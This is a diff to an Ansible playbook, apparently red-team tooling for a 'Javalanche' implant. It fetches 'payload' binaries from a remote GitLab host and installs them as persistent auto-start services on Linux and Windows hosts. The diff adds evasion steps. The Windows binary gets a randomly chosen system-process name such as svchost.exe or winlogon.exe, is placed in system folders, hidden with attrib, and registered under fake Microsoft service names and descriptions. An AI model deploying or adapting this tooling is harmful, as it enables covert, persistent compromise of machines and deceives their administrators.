@@ -1,58 +1,83 @@
 ---
-  - name: Javalanche | Define Linux Distros
+  - name: Linux | Define Distributions
     set_fact:
       linux_distros: ["RedHat", "CentOS", "Fedora", "Scientific", "CloudLinux", "OracleLinux", "Amazon", "XenServer", "Debian", "Ubuntu", "SUSE", "SLED", "SLES", "Gentoo", "Archlinux", "Mandrake", "Alpine"]
 
-  - name: Linux make directory
+  - name: Linux | Make Directory
     ansible.builtin.file:
       path: /var/log/asa/osa
       state: directory
     when: ansible_os_family in linux_distros
 
-  - name: Linux Download Agent
+  - name: Linux | Download Agent
     get_url:
       url: https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/linuxPayload.sh?ref_type=heads
       dest: /var/log/asa/osa/java-23.0.1-bin-java.sh
       mode: '0755'
     when: ansible_os_family in linux_distros
 
-  - name: Linux Download Service file
+  - name: Linux | Download Service File
     get_url:
       url: https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/java-init.service?ref_type=heads
       dest: /lib/systemd/system/java-23.0.1-bin-java.service
       mode: 644
     when: ansible_os_family in linux_distros
 
-  - name: Linux Reload Service Daemons
+  - name: Linux | Reload Service Daemons
     systemd:
       daemon_reload: yes
     when: ansible_os_family in linux_distros
 
-  - name: Linux Stop Service
+  - name: Linux | Stop Service
     service:
       name: java-23.0.1-bin-java
       state: stopped
     when: ansible_os_family in linux_distros
 
-  - name: Linux Start and Enable Service
+  - name: Linux | Start and Enable Service
     service:
       name: java-23.0.1-bin-java
       enabled: yes
       state: started
     when: ansible_os_family in linux_distros
 
-  - name: Windows Download agent
-    win_shell: wget -o C:\\Windows\\fonts\\svchost.exe https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/windowsBinary/x64/Debug/windowsBinary.exe?ref_type=heads    
+  - name: Windows | Define Paths, File Names, Service Names, and Service Descriptions
+    set_fact:
+      windows_paths: ["C:\\Windows\\fonts\\", "C:\\Program Files\\Windows NT\\Accessories\\", "C:\\Program Files\\Windows Defender\\", "C:\\ProgramData\\Microsoft\\Diagnosis\\", "C:\\Windows\\Speech\\Engines\\TTS\\", "C:\\Windows\\Cursors\\"]
+      windows_file_names: ["svchost.exe", "MsSense.exe", "conhost.exe", "wininit.exe", "winlogon.exe", "smartscreen.exe"]
+      windows_service_names: ["Windows Store Service", "Hyper-V Remote Management Service", "Network Connection Setup Service", "Remote Desktop Container", "TCP/IP NetBIOS Container"]
+      windows_service_descriptions: ["This Service Assists the Windows Store. If this service is stopped, many core windows features will not work correctly", "Provides an interface for remote hosts to communicate with Hyper-V hypervisors", "Responsible for setting up and tearing down network connections", "Secure Container for the Remote Desktop Service to run within", "Secure Container for NetBIOS over TCP/IP (NetBT) service"]
+    when: ansible_os_family == "Windows"
+    
+  - name: Windows | Select Random Path and File Name
+    set_fact:
+      windows_random_path: "{{ windows_paths | random_choice }}"
+      windows_random_file_name: "{{ windows_file_names | random_choice }}"
+    when: ansible_os_family == "Windows"
+
+  - name: Windows | Select Random Index for Service Name and Description
+    set_fact:
+      random_index: "{{ range(0, windows_service_names | length) | random }}"
+    when: ansible_os_family == "Windows"
+
+  - name: Windows | Select Random Service and Description
+    set_fact:
+      windows_random_service_name: "{{ windows_service_names[random_index] }}"
+      windows_random_service_description: "{{ windows_service_descriptions[random_index] }}"
+    when: ansible_os_family == "Windows"
+
+  - name: Windows | Download agent
+    win_shell: wget -o "{{ windows_random_path }}{{ windows_random_file_name}}" https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/windowsBinary/x64/Debug/windowsBinary.exe?ref_type=heads
     when: ansible_os_family == "Windows"
   
-  - name: Windows Hide Agent
-    win_command: "attrib +h 'C:\\Windows\\fonts\\svchost.exe'"
+  - name: Windows | Hide Agent
+    win_command: "attrib +h '{{ windows_random_path }}{{ windows_random_file_name}}'"
     when: ansible_os_family == "Windows"
 
-  - name: Windows Register Service
-    ansible.windows.win_shell: New-Service -name 'Windows Store Service' -BinaryPathName 'C:\\Windows\\fonts\\svchost.exe' -DisplayName 'Windows Store Service' -Description 'This Service Assists the Windows Store. If this service is stopped, many core windows features will not work correctly' -Startuptype Automatic
+  - name: Windows | Register Service
+    ansible.windows.win_shell: New-Service -name '{{ windows_random_service_name }}' -BinaryPathName '{{ windows_random_path }}{{ windows_random_file_name}}' -DisplayName '{{ windows_random_service_name }}' -Description '{{ windows_random_service_description }}' -Startuptype Automatic
     when: ansible_os_family == "Windows"
 
-  - name: Windows Register Service
-    ansible.windows.win_shell: Start-Service -name 'Windows Store Service'
+  - name: Windows | Start Service
+    ansible.windows.win_shell: Start-Service -name '{{ windows_random_service_name }}'
     when: ansible_os_family == "Windows"
